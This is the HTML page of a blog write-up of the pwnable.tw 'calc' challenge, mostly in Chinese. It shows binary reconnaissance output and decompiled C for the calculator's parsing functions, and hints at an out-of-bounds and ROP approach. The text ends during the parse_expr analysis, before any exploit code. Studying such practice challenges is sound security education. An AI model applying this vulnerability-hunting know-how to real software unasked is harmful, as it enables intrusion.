@@ -1,0 +1,1084 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="kazma, blog, ctf, reverse, engineering, pwn, binary, ncku, life, programming, coding, cybersecurity">
+    
+    <meta name="author" content="kazma">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://kazma.tw/2024/02/11/pwnable-tw-calc-writeup/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Pwnable.tw - calcDescriptionHave you ever use Microsoft calculator? Sourcehttps:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#4  0x1 Initial Reconnaissance題目如名是一個計算機，跟前面一樣都是 x86 的 binary，然後是 statically linked，又 NX 有開，可能高機率">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pwnable.tw calc Writeup">
+<meta property="og:url" content="https://kazma.tw/2024/02/11/Pwnable-tw-calc-Writeup/index.html">
+<meta property="og:site_name" content="kazma&#39;s blog">
+<meta property="og:description" content="Pwnable.tw - calcDescriptionHave you ever use Microsoft calculator? Sourcehttps:&#x2F;&#x2F;pwnable.tw&#x2F;challenge&#x2F;#4  0x1 Initial Reconnaissance題目如名是一個計算機，跟前面一樣都是 x86 的 binary，然後是 statically linked，又 NX 有開，可能高機率">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-02-11T14:59:16.000Z">
+<meta property="article:modified_time" content="2024-02-14T14:40:07.208Z">
+<meta property="article:author" content="kazma">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="rop">
+<meta property="article:tag" content="writeup">
+<meta property="article:tag" content="oob">
+<meta property="article:tag" content="pwnabletw">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/kazma.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/kazma.png">
+    <meta name="theme-color" content="#94878e">
+    <link rel="shortcut icon" href="/images/kazma.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            Pwnable.tw calc Writeup -
+        
+        kazma&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"kazma.tw","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":["成大資安社 創辦人/社長"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推薦閱讀","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#94878e","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/smoke.png"},"title":"kazma.tw","subtitle":{"text":["Pwning my life: ","Tales of coding, cybersecurity, and campus life"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#FFFFFF"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/kazmatw","instagram":"https://www.instagram.com/kazma.tw/","zhihu":null,"twitter":null,"email":"kazmatw@gmail.com","telegram":"https://t.me/kazma_tw","discord":"https://discord.com/users/870280109360316457"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.0","navbar":{"auto_hide":false,"color":{"left":"#5d5764","right":"#94878e","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"ls":{"path":"/archives","icon":"fa-regular fa-archive"},"tags":{"icon":"fa-solid fa-tags","path":"/tags"},"whoami":{"path":"/whoami","icon":"fa-regular fa-user"},"cv":{"path":"/cv","icon":"fa-regular fa-file"},"ctfd":{"path":"https://class.nckuctf.org/","icon":"fa-brands fa-font-awesome"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"right","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","categories":{"enable":false,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/10/25 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+        
+<link rel="stylesheet" href="/fontawesome/sharp-solid.min.css">
+
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+                <a class="logo-image" href="/">
+                    <img src="/images/kazma.png">
+                </a>
+            
+            <a class="logo-title" href="/">
+                
+                kazma&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        LS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-solid fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/whoami"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        WHOAMI
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/cv"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-file"></i>
+                                        
+                                        CV
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://class.nckuctf.org/"  >
+                                    
+                                        
+                                            <i class="fa-brands fa-font-awesome"></i>
+                                        
+                                        CTFD
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                LS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-solid fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/whoami"  >
+                             
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                WHOAMI
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/cv"  >
+                             
+                                
+                                    <i class="fa-regular fa-file"></i>
+                                
+                                CV
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        target="_blank" rel="noopener" href="https://class.nckuctf.org/"  >
+                             
+                                
+                                    <i class="fa-brands fa-font-awesome"></i>
+                                
+                                CTFD
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">Pwnable.tw calc Writeup</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header flex flex-row gap-2 items-center">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/kazma.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">kazma</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">成大資安社 創辦人/社長</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2024-02-11 22:59:16</span>
+        <span class="mobile">2024-02-11 22:59:16</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2024-02-14 22:40:07</span>
+            <span class="mobile">2024-02-14 22:40:07</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/pwn/">pwn</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/rop/">rop</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/writeup/">writeup</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/oob/">oob</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/pwnabletw/">pwnabletw</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="Pwnable-tw-calc"><a href="#Pwnable-tw-calc" class="headerlink" title="Pwnable.tw - calc"></a>Pwnable.tw - calc</h1><h3 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h3><p><code>Have you ever use Microsoft calculator?</code></p>
+<h3 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h3><p><a class="link"   target="_blank" rel="noopener" href="https://pwnable.tw/challenge/#4" >https://pwnable.tw/challenge/#4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="0x1-Initial-Reconnaissance"><a href="#0x1-Initial-Reconnaissance" class="headerlink" title="0x1 Initial Reconnaissance"></a>0x1 Initial Reconnaissance</h2><p>題目如名是一個計算機，跟前面一樣都是 x86 的 binary，然後是 statically linked，又 NX 有開，可能高機率會利用到 rop，這邊有個印象就好，執行的部分有發現一些不尋常的輸出，稍後可以來分析這些 case。</p>
+<h3 id="file"><a href="#file" class="headerlink" title="file"></a>file</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file ./calc</span><br><span class="line">./calc: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=26cd6e85abb708b115d4526bcce2ea6db8a80c64, not stripped</span><br></pre></td></tr></table></figure></div>
+<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ checksec ./calc</span><br><span class="line">[*] <span class="string">&#x27;/home/kazmatw/pwnable/calc/calc&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="calc"><a href="#calc" class="headerlink" title=".&#x2F;calc"></a>.&#x2F;calc</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">└─$ ./calc</span><br><span class="line">=== Welcome to SECPROG calculator ===</span><br><span class="line">1+1</span><br><span class="line">2</span><br><span class="line">1/0</span><br><span class="line">prevent division by zero</span><br><span class="line">1+0</span><br><span class="line">prevent division by zero</span><br><span class="line">-50+50</span><br><span class="line">43</span><br><span class="line">+100+100</span><br><span class="line">100</span><br><span class="line">No time to waste!</span><br></pre></td></tr></table></figure></div>
+<h2 id="0x2-Reverse-Engineering"><a href="#0x2-Reverse-Engineering" class="headerlink" title="0x2 Reverse Engineering"></a>0x2 Reverse Engineering</h2><p>用 ida 反編譯並且整理過後，我們大致可以理解程式的行為如下：</p>
+<h3 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">ssignal</span>(<span class="number">14</span>, timeout);</span><br><span class="line">  <span class="built_in">alarm</span>(<span class="number">60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;=== Welcome to SECPROG calculator ===&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="built_in">calc</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Merry Christmas!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>輸出歡迎後呼叫 <code>cal()</code>。</p>
+<h3 id="calc-1"><a href="#calc-1" class="headerlink" title="calc()"></a>calc()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">calc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> pool[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">bzero</span>(input, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">get_expr</span>((<span class="type">int</span>)input, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">init_pool</span>(pool);</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">parse_expr</span>((<span class="type">int</span>)input, pool) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">      <span class="built_in">fflush</span>(stdout);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>用無限迴圈讀取使用者輸入，先用 <code>bzero()</code> 初始化即將要輸入的陣列，用 <code>get_expr()</code> 讀取，讀取成功後用 <code>init_pool()</code> 初始化結果陣列，並且呼叫 <code>parse_expr()</code> 計算結果，最後輸出答案： <code>pool[pool[0]]</code> ，接著細看 <code>get_expr()</code>。</p>
+<h3 id="get-expr"><a href="#get-expr" class="headerlink" title="get_expr()"></a>get_expr()</h3><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">get_expr</span><span class="params">(<span class="type">int</span> user_input, <span class="type">int</span> max_input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> curr_index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> input_char; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> count; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( count &lt; max_input &amp;&amp; <span class="built_in">read</span>(<span class="number">0</span>, &amp;input_char, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; input_char != <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( input_char == <span class="string">&#x27;+&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;-&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;*&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;/&#x27;</span></span><br><span class="line">      || input_char == <span class="string">&#x27;%&#x27;</span></span><br><span class="line">      || input_char &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; input_char &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      curr_index = count++;</span><br><span class="line">      *(_BYTE *)(user_input + curr_index) = input_char;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(count + user_input) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>迴圈會判斷輸入是否：</p>
+<ol>
+<li>小於 1024 個 Bytes</li>
+<li>成功讀取字元</li>
+<li>字元非換行符號<br>皆符合就輸入到 <code>user_input</code> 的尾巴，最後會返回輸入的大小。</li>
+</ol>
+<h3 id="parse-expr"><a href="#parse-expr" class="headerlink" title="parse_expr()"></a>parse_expr()</h3><p>這部分有點長，我把它拆開來分析：</p>
+<h4 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">parse_expr</span><span class="params">(<span class="type">int</span> input, _DWORD *pool)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> pool_index; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> point_on_input; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> operators_array_index; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> part_size; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *part_input; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> part_input_int; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> operators_array[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> canary; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  canary = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  point_on_input = input;</span><br><span class="line">  operators_array_index = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">bzero</span>(operators_array, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(<span class="type">char</span> *)(i + input) - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      part_size = i + input - point_on_input;</span><br><span class="line">      part_input = (<span class="type">char</span> *)<span class="built_in">malloc</span>(part_size + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(part_input, point_on_input, part_size);</span><br><span class="line">      part_input[part_size] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(part_input, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        <span class="built_in">fflush</span>(stdout);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
+<p>接下來一連串的判斷是要處理運算的先後順序，首先要是符號才能進入最外層，然後會把這個符號前未處理的數字切成 <code>part_input</code> 並且判斷是否為 0（這個程式拒絕任何的 0 單獨出現 XD，前面測試階段有發現）</p>
+<h4 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h4><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">part_input_int = <span class="built_in">atoi</span>((<span class="type">int</span>)part_input);</span><br><span class="line"><span class="keyword">if</span> ( part_input_int &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  pool_index = (*pool)++;</span><br><span class="line">  pool[pool_index + <span class="number">1</span>] = part_input_int;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_BYTE *)(i + input) &amp;&amp; *(<span class="type">char</span> *)(i + <span class="number">1</span> + input) - (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&#x27;0&#x27;</span> &gt; <span class="number">9</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">  <span class="built_in">fflush</span>(stdout);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>第一部分沒問題後就會把切塊的字串轉成整數，因為 <code>*pool = pool[0]</code>，所以 <code>pool_index</code> 會儲存 <code>pool[0]</code> 之後，執行<code>pool[0]+1</code> ，這邊可以理解成 <code>pool[0] = pool.size()</code>。把切塊的整數放到 <code>pool</code> 的最後面，接著判斷符號後面是否還有東西而且不是符號，否則輸出錯誤訊息。</p>
